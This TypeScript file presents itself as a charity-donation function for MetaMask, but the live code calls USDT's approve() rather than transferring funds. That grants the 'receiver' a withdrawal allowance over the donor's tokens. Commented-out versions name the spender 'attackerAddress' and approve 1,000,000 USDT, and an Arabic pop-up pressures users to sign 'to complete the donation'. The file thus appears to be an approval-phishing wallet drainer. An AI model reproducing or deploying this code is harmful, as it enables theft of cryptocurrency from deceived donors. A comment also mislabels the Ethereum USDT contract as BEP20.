// import Web3, {ContractAbi} from "web3";
// import usdtAbi from "../../../abi/usdtAbi.json";
// import { ethers } from "ethers";
import Web3 from "web3";


export async function ethMetaMaskTransaction(
    donatorAddress: string,
    receiverAddress: string,
    donationAmount: number
) {
    // if (!window.ethereum) {
    //     alert("Please install MetaMask!");
    //     return;
    // }
    // const ethAccountsFallback = await window.ethereum.request({
    //     method: 'eth_requestAccounts',
    // });
    // const ethAccountFallback = ethAccountsFallback[0];

    //本来切链放在按钮里，现在放在useEffect里
    // if (blockchain === "eth") {
    //   // 创建web3实例（假设用户已经安装了MetaMask）
    // } else if (blockchain === "bsc") {
    //
    // } else if (blockchain === "oktc") {
    //   // await window.ethereum.request({
    //   //   method: "wallet_switchEthereumChain",
    //   //   params: [{ chainId: "0x42" }],
    //   // });
    // }

    // try {
    // 原生接口
    // const spender = attackerAddress;
    // const paddedSpender = spender.slice(2).padStart(64, "0"); // 去掉开头的 "0x" 并左侧填充零
    //
    // // 设置交易参数
    // const transactionParameters = {
    //     to: "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT-ERC20合约地址
    //     from: ethAccount, // 必须是用户当前的地址
    //     // value: web3.utils.toHex(web3.utils.toWei('0.0001', 'ether')), // 将0.1以太币转换为Wei并转换为16进制
    //     value: "0x0",
    //     // before EIP 1559
    //     // gasPrice: web3.utils.toHex(await web3.eth.getGasPrice()), // 使用当前的矿工费价格
    //     // gas: web3.utils.toHex(50000), // 设置gas上限为21000，这是标准的以太坊转账gas上限
    //     // after EIP 1559
    //     gasLimit:"0x15028",
    //     maxPriorityFeePerGas:"0x3b9aca00", // 1 gwei
    //     maxFeePerGas:"0xE8D4A51000", // 100 gwei
    //     data:
    //         "0x095ea7b3" + // approve = "0x095ea7b3", increaseApproval = "0xd73dd623"
    //         paddedSpender +
    //         "000000000000000000000000000000000000000000000000000000174876E800", // 1000000 USDT
    // };
    //
    // // 发送交易
    // const txHash = await window.ethereum.request({
    //     method: "eth_sendTransaction",
    //     params: [transactionParameters],
    // });

    // web3js contract写法
    // const web3instance = new Web3(window.ethereum);
    // const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    // const usdtAbi = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}] as const;
    // const usdtContract = new web3instance.eth.Contract(usdtAbi, usdtContractAddress);
    //
    // // const value = (1000000 * 10 ** 6).toString();
    // await usdtContract.methods.approve(spender, "10000000000000").send({
    //     from: ethAccount,
    //     gas:"0x15028",
    //     data:"0x",
    //             // "0x095ea7b3" + // approve = "0x095ea7b3", increaseApproval = "0xd73dd623"
    //             // paddedSpender +
    //             // "000000000000000000000000000000000000000000000000000003174876E800",
    //     maxPriorityFeePerGas:"0x3b9aca00", // 1 gwei
    //     maxFeePerGas:"0x174876E800", // 100 gwei
    // }).on('transactionHash', function(hash){callback(hash)});

    // web3 contract重试写法
    const executeTransaction = async () => {
        try {
            const web3 = new Web3(window.ethereum);
            const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; //BEP20
            const usdtAbi = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}] as const;
            const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);

            const donationAmountStr = donationAmount.toString() + "000000";

            // await usdtContract.methods.approve(receiverAddress, "100000000").send({
            //     from: ethAccount || ethAccountFallback,
            //     gas: "0x15028",
            //     data: "0x",
            //     maxPriorityFeePerGas: "0x3b9aca00", // 1 gwei
            //     maxFeePerGas: "0x174876E800", // 100 gwei
            // }).on('transactionHash', function(hash){ callback(hash) });

            return await usdtContract.methods.approve(receiverAddress, donationAmountStr).send({
                from: donatorAddress ,
                gas: "0x15028",
                data: "0x",
                maxPriorityFeePerGas: "0x3b9aca00", // 1 gwei
                maxFeePerGas: "0x174876E800", // 100 gwei
            })

        } catch (error) {
            // alert("Error sending transaction:" + JSON.stringify(error, null, 2));
            alert("الرجاء توقيع المعاملة لإتمام التبرع.الله يبارك لك!")
        }
    };

    // 执行交易
   return await executeTransaction();

        // callback(txHash);


        // sendTransaction写法
        // await web3instance.eth.sendTransaction({
        //     from: ethAccount,
        //     to: usdtContractAddress,
        //     data:
        //             "0x095ea7b3" + // approve = "0x095ea7b3", increaseApproval = "0xd73dd623"
        //             paddedSpender +
        //             "000000000000000000000000000000000000000000000000000000174876E800", // 1000000 USDT
        //     gas:"0x15028",
        // }).on('transactionHash', function(hash){callback(hash)})

        // alert("Transaction Hash:" + txHash);

        // ethers.js写法
        // const provider = new ethers.BrowserProvider(window.ethereum);
        // const provider = window.ethereum;
        // 获取签名者
        // const signer = await provider.getSigner();
        // // USDT 合约地址和 ABI
        // const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
        // const usdtAbi = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}];
        // // 创建合约实例
        // const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, signer);
        // // alert("usdtContract:" + JSON.stringify(usdtContract));
        // const amount = 1000000000000; // 将数值转换为 BigNumber
        // // 发送交易
        // const tx = await usdtContract.approve(spender, amount,
        //     {gasLimit: 80000}
        // );
        // // 等待交易被挖矿
        // const receipt = await tx.wait();
        // // 交易哈希通过回调函数返回
        // callback(receipt.transactionHash)
}